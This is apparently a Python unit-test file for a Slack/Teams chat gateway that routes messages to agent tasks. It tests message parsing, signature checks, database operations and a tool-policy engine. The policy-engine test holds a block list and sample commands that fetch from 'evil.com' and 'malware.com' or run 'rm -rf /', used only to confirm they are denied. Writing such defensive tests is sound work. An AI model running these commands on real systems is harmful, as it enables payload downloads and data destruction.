"""Tests for the unified IM Gateway — connector pattern, DB, routing, and notifications.

Covers:
- Connector registration and initialization
- NormalizedMessage parsing for Teams and Slack
- Unified DB operations (conversations, task mapping, dedup)
- Core message handling (commands, new task, auto-resume, notifications)
- Slack-specific: signature validation, text normalization, 3-second ACK
- Teams-specific: Adaptive Card rendering, conversation lifecycle
- Policy engine: tool whitelist/blacklist, bash restrictions, role-based access
"""

from __future__ import annotations

import importlib.util
import hashlib
import hmac
import json
import os
import sys
import tempfile
import time
import unittest
from unittest.mock import patch

# Ensure project root is on PYTHONPATH
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

IM_GATEWAY_DIR = os.path.join(PROJECT_ROOT, "im-gateway")
if IM_GATEWAY_DIR not in sys.path:
    sys.path.insert(0, IM_GATEWAY_DIR)


def _register_im_gateway_package() -> None:
    """Expose im-gateway/ as the in-memory im_gateway package for tests."""
    if "im_gateway" in sys.modules:
        return
    spec = importlib.util.spec_from_file_location(
        "im_gateway",
        os.path.join(IM_GATEWAY_DIR, "__init__.py"),
        submodule_search_locations=[IM_GATEWAY_DIR],
    )
    if spec is None or spec.loader is None:
        raise RuntimeError("Unable to load im-gateway package for tests")
    module = importlib.util.module_from_spec(spec)
    sys.modules["im_gateway"] = module
    spec.loader.exec_module(module)


_register_im_gateway_package()


# ── Connector Base & Registry ──────────────────────────────────────────────

class TestConnectorRegistry(unittest.TestCase):
    """Test connector self-registration and init_connectors logic."""

    @classmethod
    def setUpClass(cls):
        # Force connector self-registration by importing the modules
        import im_gateway.connectors.teams.connector  # noqa: F401
        import im_gateway.connectors.slack.connector  # noqa: F401

    def test_teams_registered(self):
        from im_gateway.connectors.registry import list_connectors
        names = list_connectors()
        self.assertIn("teams", names)

    def test_slack_registered(self):
        from im_gateway.connectors.registry import list_connectors
        names = list_connectors()
        self.assertIn("slack", names)

    def test_init_connectors_teams_always_available(self):
        from im_gateway.connectors.registry import init_connectors
        active = init_connectors({})
        channel_ids = [c.channel_id for c in active]
        self.assertIn("teams", channel_ids)

    def test_init_connectors_slack_needs_token(self):
        from im_gateway.connectors.registry import init_connectors
        # Without SLACK_BOT_TOKEN, slack should be skipped
        active = init_connectors({})
        channel_ids = [c.channel_id for c in active]
        self.assertNotIn("slack", channel_ids)

    def test_init_connectors_slack_with_token(self):
        from im_gateway.connectors.registry import init_connectors
        active = init_connectors({"SLACK_BOT_TOKEN": "slack-bot-token-example"})
        channel_ids = [c.channel_id for c in active]
        self.assertIn("slack", channel_ids)


# ── NormalizedMessage ──────────────────────────────────────────────────────

class TestNormalizedMessage(unittest.TestCase):
    def test_fields(self):
        from im_gateway.connectors import NormalizedMessage
        msg = NormalizedMessage(
            channel="slack",
            user_id="U123",
            workspace_id="T456",
            text="hello",
            command="",
            command_args="hello",
        )
        self.assertEqual(msg.channel, "slack")
        self.assertEqual(msg.user_id, "U123")
        self.assertEqual(msg.workspace_id, "T456")
        self.assertEqual(msg.text, "hello")

    def test_default_fields(self):
        from im_gateway.connectors import NormalizedMessage
        msg = NormalizedMessage(
            channel="teams", user_id="x", workspace_id="y",
            text="t", command="", command_args="t",
        )
        self.assertEqual(msg.session_mode, "personal")
        self.assertEqual(msg.reply_target, {})
        self.assertEqual(msg.thread_ref, "")
        self.assertFalse(msg.is_duplicate)


# ── Teams Connector ───────────────────────────────────────────────────────

class TestTeamsConnector(unittest.TestCase):
    def _make_connector(self):
        from im_gateway.connectors.teams.connector import TeamsConnector
        return TeamsConnector({})

    def test_channel_id(self):
        c = self._make_connector()
        self.assertEqual(c.channel_id, "teams")

    def test_requires_immediate_ack(self):
        c = self._make_connector()
        self.assertFalse(c.requires_immediate_ack)

    def test_normalize_message(self):
        c = self._make_connector()
        activity = {
            "type": "message",
            "text": "<p>Hello</p>",
            "textFormat": "html",
            "from": {"aadObjectId": "user-aad-123"},
            "channelData": {"tenant": {"id": "tenant-456"}},
            "conversation": {"id": "conv-789", "conversationType": "personal"},
            "serviceUrl": "https://smba.trafficmanager.net",
            "recipient": {"id": "bot-id"},
        }
        msg = c.normalize_inbound(activity)
        self.assertIsNotNone(msg)
        self.assertEqual(msg.channel, "teams")
        self.assertEqual(msg.user_id, "user-aad-123")
        self.assertEqual(msg.workspace_id, "tenant-456")
        self.assertEqual(msg.text, "Hello")
        self.assertEqual(msg.session_mode, "personal")

    def test_normalize_group_chat_session_mode(self):
        c = self._make_connector()
        activity = {
            "type": "message",
            "text": "Hello team",
            "textFormat": "plain",
            "from": {"aadObjectId": "user-group-1"},
            "channelData": {"tenant": {"id": "tenant-456"}},
            "conversation": {"id": "conv-group", "conversationType": "groupChat"},
            "serviceUrl": "https://smba.trafficmanager.net",
            "recipient": {"id": "bot-id"},
        }
        msg = c.normalize_inbound(activity)
        self.assertIsNotNone(msg)
        self.assertEqual(msg.session_mode, "shared-session")

    def test_normalize_channel_session_mode(self):
        c = self._make_connector()
        activity = {
            "type": "message",
            "text": "Hello channel",
            "textFormat": "plain",
            "from": {"aadObjectId": "user-channel-1"},
            "channelData": {"tenant": {"id": "tenant-456"}},
            "conversation": {"id": "conv-channel", "conversationType": "channel"},
            "serviceUrl": "https://smba.trafficmanager.net",
            "recipient": {"id": "bot-id"},
        }
        msg = c.normalize_inbound(activity)
        self.assertIsNotNone(msg)
        self.assertEqual(msg.session_mode, "team-scoped")

    def test_normalize_command(self):
        c = self._make_connector()
        activity = {
            "type": "message",
            "text": "/tasks",
            "textFormat": "plain",
            "from": {"aadObjectId": "user1"},
            "channelData": {"tenant": {"id": "t1"}},
            "conversation": {"id": "c1"},
            "serviceUrl": "https://smba.trafficmanager.net",
            "recipient": {"id": "bot"},
        }
        msg = c.normalize_inbound(activity)
        self.assertEqual(msg.command, "/tasks")
        self.assertEqual(msg.command_args, "")

    def test_normalize_install(self):
        c = self._make_connector()
        activity = {
            "type": "conversationUpdate",
            "from": {"aadObjectId": "user1"},
            "channelData": {"tenant": {"id": "t1"}},
            "conversation": {"id": "c1"},
            "serviceUrl": "https://smba.trafficmanager.net",
            "recipient": {"id": "bot-xyz"},
            "membersAdded": [{"id": "bot-xyz"}],
        }
        msg = c.normalize_inbound(activity)
        self.assertIsNotNone(msg)
        self.assertEqual(msg.command, "__install__")

    def test_normalize_uninstall(self):
        c = self._make_connector()
        activity = {
            "type": "conversationUpdate",
            "from": {"aadObjectId": "user1"},
            "channelData": {"tenant": {"id": "t1"}},
            "conversation": {"id": "c1"},
            "serviceUrl": "https://smba.trafficmanager.net",
            "recipient": {"id": "bot-xyz"},
            "membersRemoved": [{"id": "bot-xyz"}],
        }
        msg = c.normalize_inbound(activity)
        self.assertIsNotNone(msg)
        self.assertEqual(msg.command, "__uninstall__")

    def test_normalize_non_message_returns_none(self):
        c = self._make_connector()
        self.assertIsNone(c.normalize_inbound({"type": "typing"}))

    def test_render_help_returns_adaptive_card(self):
        c = self._make_connector()
        card = c.render_help()
        self.assertEqual(card["contentType"], "application/vnd.microsoft.card.adaptive")
        self.assertEqual(card["content"]["type"], "AdaptiveCard")

    def test_render_task_created(self):
        c = self._make_connector()
        card = c.render_task_created("task-001", "Test summary")
        self.assertIn("Task Created", json.dumps(card))

    def test_render_task_list_empty(self):
        c = self._make_connector()
        card = c.render_task_list([])
        self.assertIn("No running tasks", json.dumps(card))

    def test_render_task_list_with_tasks(self):
        c = self._make_connector()
        tasks = [{"id": "t1", "status": {"state": "TASK_STATE_WORKING"}, "summary": "test"}]
        card = c.render_task_list(tasks)
        self.assertIn("t1", json.dumps(card))

    def test_render_input_required(self):
        c = self._make_connector()
        card = c.render_input_required("What is the priority?", "task-002")
        card_json = json.dumps(card)
        self.assertIn("Input Required", card_json)
        self.assertIn("task-002", card_json)

    def test_render_task_completed(self):
        c = self._make_connector()
        card = c.render_task_completed("task-003", "All done!", [{"url": "https://github.com/pr/1", "title": "PR #1"}])
        card_json = json.dumps(card)
        self.assertIn("Task Completed", card_json)
        self.assertIn("https://github.com/pr/1", card_json)

    def test_render_error(self):
        c = self._make_connector()
        card = c.render_error("Something went wrong")
        self.assertIn("Error", json.dumps(card))


# ── Slack Connector ────────────────────────────────────────────────────────

class TestSlackConnector(unittest.TestCase):
    def _make_connector(self, signing_secret="test-secret"):
        from im_gateway.connectors.slack.connector import SlackConnector
        return SlackConnector({
            "SLACK_BOT_TOKEN": "xoxb-test",
            "SLACK_SIGNING_SECRET": signing_secret,
        })

    def test_channel_id(self):
        c = self._make_connector()
        self.assertEqual(c.channel_id, "slack")

    def test_requires_immediate_ack(self):
        c = self._make_connector()
        self.assertTrue(c.requires_immediate_ack)

    def test_is_configured_without_token(self):
        from im_gateway.connectors.slack.connector import SlackConnector
        self.assertFalse(SlackConnector.is_configured({}))

    def test_is_configured_with_token(self):
        from im_gateway.connectors.slack.connector import SlackConnector
        self.assertTrue(SlackConnector.is_configured({"SLACK_BOT_TOKEN": "xoxb-test"}))

    def test_signature_validation_valid(self):
        c = self._make_connector("my-secret")
        timestamp = str(int(time.time()))
        body = b'{"event": {"text": "hello"}}'
        sig_basestring = f"v0:{timestamp}:{body.decode('utf-8')}"
        sig = "v0=" + hmac.new(
            b"my-secret", sig_basestring.encode("utf-8"), hashlib.sha256,
        ).hexdigest()
        self.assertTrue(c.validate_request(
            {"X-Slack-Request-Timestamp": timestamp, "X-Slack-Signature": sig},
            body,
        ))

    def test_signature_validation_invalid(self):
        c = self._make_connector("my-secret")
        timestamp = str(int(time.time()))
        self.assertFalse(c.validate_request(
            {"X-Slack-Request-Timestamp": timestamp, "X-Slack-Signature": "v0=bad"},
            b'{"event": {"text": "hello"}}',
        ))

    def test_signature_validation_replay(self):
        c = self._make_connector("my-secret")
        old_timestamp = str(int(time.time()) - 600)
        self.assertFalse(c.validate_request(
            {"X-Slack-Request-Timestamp": old_timestamp, "X-Slack-Signature": "v0=anything"},
            b'{}',
        ))

    def test_signature_validation_dev_mode(self):
        c = self._make_connector("")  # no signing secret
        self.assertTrue(c.validate_request({}, b''))

    def test_normalize_dm_message(self):
        c = self._make_connector()
        payload = {
            "team_id": "T123",
            "event": {
                "type": "message",
                "user": "U456",
                "channel": "D789",
                "text": "Hello world",
                "ts": "1234567890.123456",
            },
        }
        msg = c.normalize_inbound(payload)
        self.assertIsNotNone(msg)
        self.assertEqual(msg.channel, "slack")
        self.assertEqual(msg.user_id, "U456")
        self.assertEqual(msg.workspace_id, "T123")
        self.assertEqual(msg.text, "Hello world")
        self.assertEqual(msg.reply_target["channel"], "D789")
        self.assertEqual(msg.session_mode, "personal")

    def test_normalize_mpim_message_sets_shared_session(self):
        c = self._make_connector()
        payload = {
            "team_id": "T123",
            "event": {
                "type": "message",
                "user": "U456",
                "channel": "G999",
                "channel_type": "mpim",
                "text": "Hello group",
                "ts": "1234567890.123456",
            },
        }
        msg = c.normalize_inbound(payload)
        self.assertIsNotNone(msg)
        self.assertEqual(msg.session_mode, "shared-session")

    def test_normalize_ignores_bot_messages(self):
        c = self._make_connector()
        payload = {
            "team_id": "T123",
            "event": {"type": "message", "bot_id": "B123", "text": "bot msg", "channel": "D1"},
        }
        self.assertIsNone(c.normalize_inbound(payload))

    def test_normalize_ignores_subtypes(self):
        c = self._make_connector()
        payload = {
            "team_id": "T123",
            "event": {"type": "message", "subtype": "message_changed", "text": "edit", "channel": "D1", "user": "U1"},
        }
        self.assertIsNone(c.normalize_inbound(payload))

    def test_normalize_url_verification_returns_none(self):
        c = self._make_connector()
        payload = {"type": "url_verification", "challenge": "xyz"}
        self.assertIsNone(c.normalize_inbound(payload))

    def test_text_normalization_mentions(self):
        from im_gateway.connectors.slack.connector import SlackConnector
        result = SlackConnector._normalize_text("Hello <@U123> please review")
        self.assertEqual(result, "Hello @U123 please review")

    def test_text_normalization_channels(self):
        from im_gateway.connectors.slack.connector import SlackConnector
        result = SlackConnector._normalize_text("See <#C456|general> for details")
        self.assertEqual(result, "See #general for details")

    def test_text_normalization_links(self):
        from im_gateway.connectors.slack.connector import SlackConnector
        result = SlackConnector._normalize_text("Visit <https://example.com|Example> now")
        self.assertEqual(result, "Visit Example (https://example.com) now")

    def test_text_normalization_bare_links(self):
        from im_gateway.connectors.slack.connector import SlackConnector
        result = SlackConnector._normalize_text("Go to <https://example.com>")
        self.assertEqual(result, "Go to https://example.com")

    def test_render_help_returns_blocks(self):
        c = self._make_connector()
        result = c.render_help()
        self.assertIn("blocks", result)
        blocks = result["blocks"]
        self.assertGreater(len(blocks), 0)
        # First block should be a header
        self.assertEqual(blocks[0]["type"], "header")

    def test_render_task_created(self):
        c = self._make_connector()
        result = c.render_task_created("task-001", "My test task")
        blocks = result["blocks"]
        block_text = json.dumps(blocks)
        self.assertIn("Task Created", block_text)
        self.assertIn("task-001", block_text)

    def test_render_task_list_empty(self):
        c = self._make_connector()
        result = c.render_task_list([])
        self.assertIn("No running tasks", json.dumps(result))

    def test_render_task_list_with_tasks(self):
        c = self._make_connector()
        tasks = [{"id": "t1", "status": {"state": "TASK_STATE_WORKING"}, "summary": "test"}]
        result = c.render_task_list(tasks)
        self.assertIn("t1", json.dumps(result))

    def test_render_input_required(self):
        c = self._make_connector()
        result = c.render_input_required("What stack?", "task-x")
        block_text = json.dumps(result)
        self.assertIn("Input Required", block_text)
        self.assertIn("task-x", block_text)

    def test_render_task_completed_with_links(self):
        c = self._make_connector()
        result = c.render_task_completed("t1", "Done!", [{"url": "https://pr", "title": "PR"}])
        block_text = json.dumps(result)
        self.assertIn("Task Completed", block_text)
        self.assertIn("https://pr", block_text)

    def test_render_error(self):
        c = self._make_connector()
        result = c.render_error("Oops")
        self.assertIn(":warning:", json.dumps(result))

    def test_render_task_list_max_blocks(self):
        c = self._make_connector()
        tasks = [{"id": f"t{i}", "status": {"state": "WORKING"}} for i in range(60)]
        result = c.render_task_list(tasks)
        self.assertLessEqual(len(result["blocks"]), 50)  # MAX_BLOCKS


# ── Unified DB ─────────────────────────────────────────────────────────────

class TestGatewayDB(unittest.TestCase):
    def setUp(self):
        self._tmpfile = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self._tmpfile.close()
        from im_gateway.db import GatewayDB
        self.db = GatewayDB(db_path=self._tmpfile.name)

    def tearDown(self):
        os.unlink(self._tmpfile.name)

    def test_upsert_and_get_conversation(self):
        self.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        conv = self.db.get_conversation("slack", "U1", "T1")
        self.assertIsNotNone(conv)
        self.assertEqual(conv["channel"], "slack")
        self.assertEqual(conv["target"]["channel"], "D1")
        self.assertEqual(conv["is_valid"], 1)

    def test_upsert_updates_existing(self):
        self.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        self.db.upsert_conversation("slack", "U1", "T1", {"channel": "D2"})
        conv = self.db.get_conversation("slack", "U1", "T1")
        self.assertEqual(conv["target"]["channel"], "D2")
        self.assertEqual(conv["failures"], 0)  # reset on upsert

    def test_delete_conversation(self):
        self.db.upsert_conversation("teams", "U1", "T1", {"conv": "c1"})
        self.db.delete_conversation("teams", "U1", "T1")
        self.assertIsNone(self.db.get_conversation("teams", "U1", "T1"))

    def test_mark_conversation_invalid(self):
        self.db.upsert_conversation("slack", "U1", "T1", {})
        self.db.mark_conversation_invalid("slack", "U1", "T1")
        conv = self.db.get_conversation("slack", "U1", "T1")
        self.assertEqual(conv["is_valid"], 0)

    def test_increment_failure_auto_invalidate(self):
        self.db.upsert_conversation("slack", "U1", "T1", {})
        for _ in range(5):
            self.db.increment_failure("slack", "U1", "T1")
        conv = self.db.get_conversation("slack", "U1", "T1")
        self.assertEqual(conv["is_valid"], 0)
        self.assertEqual(conv["failures"], 5)

    def test_task_mapping_crud(self):
        self.db.add_task_mapping("t1", "slack", "U1", "T1", "thread_123")
        owner = self.db.get_task_owner("t1")
        self.assertEqual(owner["channel"], "slack")
        self.assertEqual(owner["user_id"], "U1")
        self.assertEqual(owner["thread_ref"], "thread_123")

    def test_get_user_tasks(self):
        self.db.add_task_mapping("t1", "slack", "U1", "T1")
        self.db.add_task_mapping("t2", "slack", "U1", "T1")
        self.db.add_task_mapping("t3", "teams", "U2", "T2")
        tasks = self.db.get_user_tasks("slack", "U1", "T1")
        self.assertEqual(len(tasks), 2)

    def test_update_task_state(self):
        self.db.add_task_mapping("t1", "slack", "U1", "T1")
        self.db.update_task_state("t1", "TASK_STATE_COMPLETED")
        tasks = self.db.get_user_tasks("slack", "U1", "T1")
        self.assertEqual(tasks[0]["state"], "TASK_STATE_COMPLETED")

    def test_count_active_tasks(self):
        self.db.add_task_mapping("t1", "slack", "U1", "T1")
        self.db.add_task_mapping("t2", "slack", "U1", "T1")
        self.db.update_task_state("t1", "TASK_STATE_COMPLETED")
        active = self.db.count_active_tasks("slack", "U1", "T1")
        self.assertEqual(active, 1)

    def test_activity_dedup(self):
        self.assertFalse(self.db.check_and_record_activity("a1"))
        self.assertTrue(self.db.check_and_record_activity("a1"))

    def test_cleanup_old_activities(self):
        self.db.check_and_record_activity("old-1")
        # Use negative age so cutoff is in the future, guaranteeing deletion
        self.db.cleanup_old_activities(max_age_seconds=-1)
        self.assertFalse(self.db.check_and_record_activity("old-1"))

    def test_cross_platform_isolation(self):
        """Slack and Teams tasks for same user_id should be isolated."""
        self.db.add_task_mapping("t1", "slack", "U1", "T1")
        self.db.add_task_mapping("t2", "teams", "U1", "T1")
        slack_tasks = self.db.get_user_tasks("slack", "U1", "T1")
        teams_tasks = self.db.get_user_tasks("teams", "U1", "T1")
        self.assertEqual(len(slack_tasks), 1)
        self.assertEqual(len(teams_tasks), 1)


# ── Policy Engine ──────────────────────────────────────────────────────────

class TestPolicyEvaluator(unittest.TestCase):
    def test_default_allow(self):
        from common.policy import PolicyEvaluator
        pe = PolicyEvaluator()
        result = pe.evaluate({}, {"agentId": "x", "capabilities": ["a"]})
        self.assertTrue(result["approved"])

    def test_register_and_evaluate(self):
        from common.policy import PolicyEvaluator, SecurityPolicy
        pe = PolicyEvaluator()
        policy = SecurityPolicy(allowed_roles=["admin", "dev"])
        pe.register_agent_policy("web-agent", policy)

        # user role matches
        result = pe.evaluate(
            {"metadata": {"userRole": "admin"}},
            {"agentId": "web-agent", "capabilities": ["web.task.execute"]},
        )
        self.assertTrue(result["approved"])

        # user role does not match
        result = pe.evaluate(
            {"metadata": {"userRole": "viewer"}},
            {"agentId": "web-agent", "capabilities": ["web.task.execute"]},
        )
        self.assertFalse(result["approved"])

    def test_wildcard_role(self):
        from common.policy import PolicyEvaluator, SecurityPolicy
        pe = PolicyEvaluator()
        policy = SecurityPolicy(allowed_roles=["*"])
        pe.register_agent_policy("web-agent", policy)
        result = pe.evaluate(
            {"metadata": {"userRole": "anyone"}},
            {"agentId": "web-agent", "capabilities": []},
        )
        self.assertTrue(result["approved"])

    def test_check_tool_allowed(self):
        from common.policy import PolicyEvaluator, SecurityPolicy
        pe = PolicyEvaluator()
        policy = SecurityPolicy(
            allowed_tools=["bash", "read", "write"],
            disallowed_tools=["web_fetch"],
        )
        pe.register_agent_policy("web-agent", policy)

        ok, _ = pe.check_tool_allowed("web-agent", "bash")
        self.assertTrue(ok)

        ok, _ = pe.check_tool_allowed("web-agent", "web_fetch")
        self.assertFalse(ok)

        ok, _ = pe.check_tool_allowed("web-agent", "unknown_tool")
        self.assertFalse(ok)

    def test_check_tool_no_policy(self):
        from common.policy import PolicyEvaluator
        pe = PolicyEvaluator()
        ok, _ = pe.check_tool_allowed("no-agent", "bash")
        self.assertTrue(ok)

    def test_check_bash_command(self):
        from common.policy import PolicyEvaluator, SecurityPolicy, BashRestrictions
        pe = PolicyEvaluator()
        policy = SecurityPolicy(
            bash_restrictions=BashRestrictions(
                blocked_commands=["curl", "wget", "rm -rf /"],
            ),
        )
        pe.register_agent_policy("web-agent", policy)

        ok, _ = pe.check_bash_command("web-agent", "npm run build")
        self.assertTrue(ok)

        ok, _ = pe.check_bash_command("web-agent", "curl https://evil.com")
        self.assertFalse(ok)

        ok, _ = pe.check_bash_command("web-agent", "wget http://malware.com/pkg")
        self.assertFalse(ok)

        ok, _ = pe.check_bash_command("web-agent", "rm -rf /")
        self.assertFalse(ok)

    def test_security_policy_from_dict(self):
        from common.policy import SecurityPolicy
        data = {
            "allowedTools": ["bash", "read"],
            "disallowedTools": ["web_fetch"],
            "allowedRoles": ["dev"],
            "bashRestrictions": {
                "blockedCommands": ["curl"],
                "allowedNetworkHosts": ["registry:9000"],
                "maxOutputBytes": 500000,
            },
        }
        policy = SecurityPolicy.from_dict(data)
        self.assertEqual(policy.allowed_tools, ["bash", "read"])
        self.assertEqual(policy.disallowed_tools, ["web_fetch"])
        self.assertEqual(policy.allowed_roles, ["dev"])
        self.assertEqual(policy.bash_restrictions.blocked_commands, ["curl"])
        self.assertEqual(policy.bash_restrictions.max_output_bytes, 500000)


# ── Core Message Handling ──────────────────────────────────────────────────

class TestHandleInbound(unittest.TestCase):
    """Test handle_inbound routing without a live Compass."""

    def _make_msg(self, text="", command="", command_args="", channel="slack"):
        from im_gateway.connectors import NormalizedMessage
        return NormalizedMessage(
            channel=channel,
            user_id="U1",
            workspace_id="T1",
            text=text,
            command=command,
            command_args=command_args,
            reply_target={"channel": "D1"},
        )

    def _make_connector(self, channel="slack"):
        if channel == "slack":
            from im_gateway.connectors.slack.connector import SlackConnector
            return SlackConnector({"SLACK_BOT_TOKEN": "xoxb-test"})
        else:
            from im_gateway.connectors.teams.connector import TeamsConnector
            return TeamsConnector({})

    def setUp(self):
        import im_gateway.app as app_mod
        self._tmpfile = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self._tmpfile.close()
        from im_gateway.db import GatewayDB
        app_mod.db = GatewayDB(db_path=self._tmpfile.name)

    def tearDown(self):
        os.unlink(self._tmpfile.name)

    def test_install_command(self):
        import im_gateway.app as app_mod
        connector = self._make_connector("slack")
        msg = self._make_msg(command="__install__", channel="slack")
        result = app_mod.handle_inbound(msg, connector)
        self.assertIsNotNone(result)
        # Should render help
        self.assertIn("blocks", result)

    def test_uninstall_command(self):
        import im_gateway.app as app_mod
        connector = self._make_connector("slack")
        msg = self._make_msg(command="__uninstall__", channel="slack")
        result = app_mod.handle_inbound(msg, connector)
        self.assertIsNone(result)

    def test_help_command(self):
        import im_gateway.app as app_mod
        connector = self._make_connector("slack")
        msg = self._make_msg(text="/help", command="/help")
        result = app_mod.handle_inbound(msg, connector)
        self.assertIn("blocks", result)

    def test_compass_subcommand_help(self):
        import im_gateway.app as app_mod
        connector = self._make_connector("slack")
        msg = self._make_msg(text="/compass help", command="/compass", command_args="help")
        result = app_mod.handle_inbound(msg, connector)
        self.assertIn("blocks", result)

    def test_unknown_command(self):
        import im_gateway.app as app_mod
        connector = self._make_connector("slack")
        msg = self._make_msg(text="/foobar", command="/foobar")
        result = app_mod.handle_inbound(msg, connector)
        self.assertIn(":warning:", json.dumps(result))

    def test_message_too_long(self):
        import im_gateway.app as app_mod
        connector = self._make_connector("slack")
        msg = self._make_msg(text="x" * 5000)
        result = app_mod.handle_inbound(msg, connector)
        self.assertIn("too long", json.dumps(result))

    def test_empty_text_error(self):
        import im_gateway.app as app_mod
        connector = self._make_connector("slack")
        msg = self._make_msg(text="")
        result = app_mod.handle_inbound(msg, connector)
        self.assertIn("enter your request", json.dumps(result).lower())

    def test_teams_help_returns_adaptive_card(self):
        import im_gateway.app as app_mod
        connector = self._make_connector("teams")
        msg = self._make_msg(text="/help", command="/help", channel="teams")
        result = app_mod.handle_inbound(msg, connector)
        self.assertEqual(result["contentType"], "application/vnd.microsoft.card.adaptive")

    def test_new_message_persists_session_mode(self):
        import im_gateway.app as app_mod
        import im_gateway.compass_client as cc

        connector = self._make_connector("slack")
        msg = self._make_msg(text="Build feature", channel="slack")
        msg.session_mode = "shared-session"

        original = cc.send_message
        cc.send_message = lambda message: {"task": {"id": "task-session-1"}}
        try:
            result = app_mod.handle_inbound(msg, connector)
            self.assertIn("task-session-1", json.dumps(result))
            tasks = app_mod.db.get_user_tasks("slack", "U1", "T1")
            self.assertEqual(tasks[0]["session_mode"], "shared-session")
        finally:
            cc.send_message = original


# ── Sanitization ───────────────────────────────────────────────────────────

class TestSanitization(unittest.TestCase):
    def test_strip_artifact_paths(self):
        import im_gateway.app as app_mod
        text = "File at /app/artifacts/workspaces/task-123/web-agent/result.json"
        result = app_mod._sanitize_summary(text)
        self.assertNotIn("/app/artifacts", result)
        self.assertIn("[artifact-path]", result)

    def test_strip_credentials(self):
        import im_gateway.app as app_mod
        text = "Using token=ghp_abcdef123456 for auth"
        result = app_mod._sanitize_summary(text)
        self.assertIn("[REDACTED]", result)
        self.assertNotIn("ghp_abcdef", result)


# ── Existing modules that should still work ────────────────────────────────

class TestCircuitBreaker(unittest.TestCase):
    def test_basic_circuit(self):
        from common.circuit_breaker import CircuitBreaker, CircuitOpenError
        cb = CircuitBreaker(failure_threshold=2, reset_timeout=0.1)
        # Success
        self.assertEqual(cb.call(lambda: 42), 42)
        # Failures
        with self.assertRaises(ValueError):
            cb.call(lambda: (_ for _ in ()).throw(ValueError("fail")))
        with self.assertRaises(ValueError):
            cb.call(lambda: (_ for _ in ()).throw(ValueError("fail2")))
        # Circuit should be open now
        with self.assertRaises(CircuitOpenError):
            cb.call(lambda: 1)

    def test_reset(self):
        from common.circuit_breaker import CircuitBreaker
        cb = CircuitBreaker(failure_threshold=1, reset_timeout=0.05)
        with self.assertRaises(ValueError):
            cb.call(lambda: (_ for _ in ()).throw(ValueError("fail")))
        cb.reset()
        self.assertEqual(cb.call(lambda: 99), 99)


class TestCommandGate(unittest.TestCase):
    def test_pass_through_normal_text(self):
        from common.command_gate import gate_message, GateResult
        result = gate_message("Hello world", user_id="user1", role="user")
        self.assertEqual(result, GateResult.PASS)

    def test_filter_help(self):
        from common.command_gate import gate_message, GateResult
        result = gate_message("/help", user_id="user1", role="user")
        self.assertEqual(result, GateResult.FILTER)

    def test_admin_command_denied(self):
        from common.command_gate import gate_message, GateResult
        result = gate_message("/clear", user_id="user1", role="user")
        self.assertEqual(result, GateResult.DENY)

    def test_admin_command_allowed(self):
        from common.command_gate import gate_message, GateResult
        result = gate_message("/clear", user_id="admin1", role="admin")
        self.assertEqual(result, GateResult.PASS)


class TestStartupBackoff(unittest.TestCase):
    def test_first_attempt_no_delay(self):
        from common.startup_backoff import current_attempt
        # Just verify it doesn't crash
        attempt = current_attempt()
        self.assertIsInstance(attempt, int)


class TestInstallSlug(unittest.TestCase):
    def test_slug_deterministic(self):
        from common.install_slug import get_install_slug
        slug1 = get_install_slug("/some/path")
        slug2 = get_install_slug("/some/path")
        self.assertEqual(slug1, slug2)
        self.assertEqual(len(slug1), 8)

    def test_slug_different_paths(self):
        from common.install_slug import get_install_slug
        self.assertNotEqual(
            get_install_slug("/path/a"),
            get_install_slug("/path/b"),
        )


# ── Agent Bus ──────────────────────────────────────────────────────────────

class TestAgentBus(unittest.TestCase):
    def test_resolve_callback(self):
        from common.agent_bus import AgentBus
        bus = AgentBus()
        dest = bus._resolve("callback:http://compass:8080/tasks/x/callbacks")
        self.assertEqual(dest.type, "callback")
        self.assertEqual(dest.address, "http://compass:8080/tasks/x/callbacks")

    def test_resolve_agent(self):
        from common.agent_bus import AgentBus
        bus = AgentBus()
        dest = bus._resolve("agent:scm.pr.create")
        self.assertEqual(dest.type, "agent")
        self.assertEqual(dest.address, "scm.pr.create")

    def test_resolve_im(self):
        from common.agent_bus import AgentBus
        bus = AgentBus()
        dest = bus._resolve("im:slack")
        self.assertEqual(dest.type, "im")
        self.assertEqual(dest.address, "slack")

    def test_resolve_invalid_no_prefix(self):
        from common.agent_bus import AgentBus
        bus = AgentBus()
        with self.assertRaises(ValueError):
            bus._resolve("no-prefix")

    def test_resolve_unknown_prefix(self):
        from common.agent_bus import AgentBus
        bus = AgentBus()
        with self.assertRaises(ValueError):
            bus._resolve("unknown:something")

    def test_send_unknown_type(self):
        from common.agent_bus import AgentBus
        bus = AgentBus()
        # Monkeypatch _resolve to return unknown type
        original_resolve = bus._resolve
        bus._resolve = lambda to: type("D", (), {"type": "badtype", "address": "x"})()
        with self.assertRaises(ValueError):
            bus.send("badtype:x", "content")
        bus._resolve = original_resolve


# ── Devlog ─────────────────────────────────────────────────────────────────

class TestDevlog(unittest.TestCase):
    def test_preview_data_short_string(self):
        from common.devlog import preview_data
        result = preview_data("Hello world")
        self.assertEqual(result, "Hello world")

    def test_preview_data_truncation(self):
        from common.devlog import preview_data
        result = preview_data("x" * 5000, limit=100)
        self.assertIn("...[truncated]...", result)
        self.assertLess(len(result), 200)

    def test_preview_data_dict(self):
        from common.devlog import preview_data
        result = preview_data({"key": "value"})
        self.assertIn('"key"', result)
        self.assertIn('"value"', result)

    def test_debug_log_does_not_crash(self):
        from common.devlog import debug_log
        # Just ensure it runs without error
        debug_log("test-actor", "test-event", extra_field="value")

    def test_record_workspace_stage(self):
        from common.devlog import record_workspace_stage
        with tempfile.TemporaryDirectory() as tmpdir:
            record_workspace_stage(tmpdir, "test-agent", "phase-1", task_id="t1")
            log_path = os.path.join(tmpdir, "test-agent", "command-log.txt")
            self.assertTrue(os.path.isfile(log_path))
            with open(log_path) as f:
                content = f.read()
            self.assertIn("phase-1", content)

            summary_path = os.path.join(tmpdir, "test-agent", "stage-summary.json")
            self.assertTrue(os.path.isfile(summary_path))
            with open(summary_path) as f:
                summary = json.load(f)
            self.assertEqual(summary["taskId"], "t1")
            self.assertEqual(summary["currentPhase"], "phase-1")
            self.assertEqual(summary["agentId"], "test-agent")


# ── Per-Task Exit ──────────────────────────────────────────────────────────

class TestPerTaskExit(unittest.TestCase):
    def test_register_and_acknowledge(self):
        from common.per_task_exit import PerTaskExitHandler
